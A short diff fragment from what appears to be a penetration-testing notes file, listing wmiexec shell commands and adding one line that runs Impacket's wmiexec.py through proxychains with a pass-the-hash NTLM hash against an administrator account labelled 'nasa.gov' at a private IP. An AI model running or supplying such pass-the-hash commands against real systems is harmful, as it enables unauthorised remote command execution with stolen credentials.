@@ -465,6 +465,8 @@ net use P: \\Name\zhq3211
  lput {src_file, dst_path}   - uploads a local file to the dst_path (dst_path = default current directory)
  lget {file}                 - downloads pathname to the current local dir
  ! {cmd}                    - executes a local shell cmd
+
+proxychains python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:fbe5588a79e40d41d77a40569c7b3090 nasa.gov/administrator@10.10.10.140 -codec gbk
 ```
 
 # Article
